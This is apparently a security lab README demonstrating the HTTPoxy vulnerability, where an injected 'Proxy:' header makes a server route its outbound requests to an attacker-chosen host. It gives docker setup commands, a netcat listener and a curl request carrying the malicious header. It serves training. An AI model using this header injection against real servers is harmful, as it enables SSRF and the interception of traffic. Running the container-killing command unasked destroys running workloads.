# HTTPOXY
## Injection of environment variable via "Proxy:" HTTP Header
### Can lead to SSRF

### Clear any existing containers
```
docker kill $(docker ps -q)
```

### Run the lab:
```
cd 1-httpoxy
docker-compose up -d
```

### On another terminal windows run:
```
nc -lvp 9999
curl -H "Proxy: [Your IP]:9999" http://[Your IP]:8080/index.php 
```

![image](https://user-images.githubusercontent.com/31791455/140382286-fdfccc75-cf13-488f-9ebd-aa8c83fe38d3.png)


### Explanation
HTTP Server will interpret Proxy: header value and try to connect to it. This can lead to SSRF.

### References and recommended reading
https://httpoxy.org/

### Credits:
https://github.com/vulhub/vulhub/tree/4d17ab2d4df39eefad5c498c5aa60b036a05494d/cgi/httpoxy

